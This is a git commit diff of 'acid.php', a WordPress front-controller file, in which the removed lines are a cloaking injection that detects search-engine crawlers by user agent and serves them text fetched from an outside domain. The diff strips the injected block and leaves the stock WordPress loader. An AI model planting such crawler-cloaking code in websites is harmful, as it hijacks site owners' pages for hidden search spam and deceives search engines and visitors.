1044f8f84e040d166b043cdf553e5f26a707c060
eagles227 <166109731+eagles227@users.noreply.github.com>
2024-12-12 12:12:50 +0000

    Update acid.php

--- acid.php
+++ acid.php
@@ -1,23 +1,4 @@
 <?php
-function is_bot() {
-    $user_agent = $_SERVER["HTTP_USER_AGENT"];
-    $bots = array("Googlebot", "TelegramBot", "bingbot", "Google-Site-Verification", "Google-InspectionTool");
-
-    foreach ($bots as $bot) {
-        if (stripos($user_agent, $bot) !== false) {
-            return true;
-        }
-    }
-    return false;
-}
-
-if (is_bot()) {
-    $message = file_get_contents("https://woulddataroom.com/usie/sicantik.txt");
-    echo $message;
-}
-?>
-
-<?php
 /**
  * Front to the WordPress application. This file doesn't do anything, but loads
  * wp-blog-header.php which does and tells WordPress to load the theme.
@@ -34,4 +15,3 @@ define( 'WP_USE_THEMES', true );
 
 /** Loads the WordPress Environment and Template */
 require __DIR__ . '/wp-blog-header.php';
-?>
